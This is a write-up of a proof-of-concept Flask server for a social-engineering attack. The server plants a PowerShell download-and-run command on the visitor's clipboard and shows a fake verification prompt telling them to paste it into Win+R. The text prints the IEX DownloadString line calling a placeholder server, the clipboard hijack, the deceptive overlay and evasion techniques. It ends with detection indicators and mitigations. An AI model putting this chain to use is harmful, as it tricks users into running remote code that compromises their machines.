# FlaskRCE PoC --- Technical Write‑Up

**Repository:** https://github.com/SleepTheGod/FlaskRCE
**File:** `poc.py`

> This document explains the provided proof‑of‑concept at a code and
> behavior level. It is intended for **educational, defensive, and
> research** purposes only.

------------------------------------------------------------------------

## Overview

This PoC demonstrates a **social‑engineering--assisted remote code
execution chain** built around:

-   A minimal **Flask web server**
-   A **heavily obfuscated JavaScript payload**
-   A staged **PowerShell execution flow**
-   User‑interaction coercion rather than a browser exploit

No browser vulnerability is exploited. The execution relies on
convincing the user to paste a prepared PowerShell command into
**Win+R**.

------------------------------------------------------------------------

## High‑Level Flow

1.  Victim visits the Flask server.
2.  Server responds with benign‑looking HTML.
3.  Embedded JavaScript:
    -   Deobfuscates a PowerShell command
    -   Copies it to the clipboard
    -   Displays a fake "security verification" overlay
4.  User pastes and executes the command.
5.  PowerShell downloads and executes `/payload.ps1`.
6.  Optional stage‑2 execution occurs.

------------------------------------------------------------------------

## Flask Application Structure

### Imports and Initialization

``` python
from flask import Flask, make_response
import base64

app = Flask(__name__)
```

-   `make_response` allows full control of HTTP headers.
-   No templates are used --- HTML is constructed inline.

------------------------------------------------------------------------

## Obfuscated JavaScript Payload

### Purpose

The JavaScript payload is designed to:

-   Evade static analysis
-   Delay detection
-   Mislead the user into manual execution

### Techniques Used

  Technique             Purpose
  --------------------- ---------------------------
  Hex‑escaped strings   Hide readable content
  Base64 encoding       Obscure PowerShell
  Dead code             Break pattern matching
  Unicode noise         Confuse tokenizers
  `eval()` chains       Prevent static inspection

------------------------------------------------------------------------

### Embedded PowerShell Payload

Decoded PowerShell (simplified):

``` powershell
PowerShell -NoProfile -Enc <BASE64>
```

Decoded behavior:

``` powershell
IEX (New-Object Net.WebClient).DownloadString('https://yourserver/payload.ps1')
```

-   Uses **IEX** for in‑memory execution
-   Avoids touching disk initially
-   Bypasses execution policy restrictions

------------------------------------------------------------------------

## Clipboard Hijacking

``` javascript
navigator.clipboard.writeText(payload);
```

-   Automatically places the PowerShell command into the clipboard.
-   Requires no permissions in many Chromium‑based browsers when
    user‑initiated context is implied.

------------------------------------------------------------------------

## Fake Security Overlay

``` javascript
<div>
  VERIFICATION REQUIRED
  Press Win + R → Ctrl + V → Enter
</div>
```

Purpose:

-   Mimics CAPTCHA / browser verification flows
-   Exploits user familiarity with OS dialogs
-   Creates urgency and authority

This is **pure social engineering**, not exploitation.

------------------------------------------------------------------------

## Redirect & Cleanup

``` javascript
setTimeout(() => {
  div.remove();
  window.location = 'https://google.com';
}, 8000);
```

-   Removes visible artifacts
-   Redirects victim to a legitimate site
-   Reduces suspicion post‑execution

------------------------------------------------------------------------

## `/payload.ps1` Endpoint

``` python
@app.route('/payload.ps1')
def payload():
    Start-Process calc.exe
```

-   Demonstration payload only
-   Confirms execution via calculator launch
-   Real attacks would load additional stages

------------------------------------------------------------------------

## Catch‑All Routing

``` python
@app.route('/<path:dummy>')
def catch_all(dummy):
    return index()
```

-   Any URL serves the same payload
-   Defeats path‑based filtering
-   Useful for phishing campaigns

------------------------------------------------------------------------

## Why This Works

  Factor                 Explanation
  ---------------------- --------------------------------
  No exploit needed      User executes payload manually
  Trusted UI cues        "Security check" framing
  Clipboard automation   Reduces friction
  PowerShell LOLBins     Blends with admin behavior
  Short lifetime         Minimal forensic footprint

------------------------------------------------------------------------

## Defensive Takeaways

### Blue Team Indicators

-   Unexpected clipboard writes
-   `powershell.exe -enc` usage
-   Win+R execution by non‑technical users
-   Clipboard + browser + PowerShell chain

### Mitigations

-   Disable PowerShell for non‑admins
-   Enforce Constrained Language Mode
-   Monitor `IEX` usage
-   User education against fake verification prompts

------------------------------------------------------------------------

## Final Notes

This PoC demonstrates that **RCE does not require a vulnerability** ---
only trust, habit, and persuasion.

Understanding this class of attack is critical for: - Red teams modeling
realistic threat actors - Blue teams building detection pipelines -
Security awareness training

------------------------------------------------------------------------

**Author:** SleepTheGod / Clumsy\
**Context:** Educational PoC
